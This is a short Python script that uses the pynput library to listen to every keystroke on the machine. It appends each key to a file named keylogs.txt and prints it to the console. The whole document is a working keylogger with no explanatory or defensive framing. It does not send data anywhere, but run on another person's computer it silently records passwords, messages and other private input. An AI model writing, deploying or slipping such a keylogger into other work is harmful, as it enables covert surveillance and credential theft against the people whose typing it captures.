import threading
from pynput import keyboard

lock = threading.Lock()

def on_press(key):
    with lock:
        try:
            k = key.char
        except AttributeError:
            k = str(key)
        with open("keylogs.txt", "a") as f:
            f.write(k)
        print(f"Key pressed: {k}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()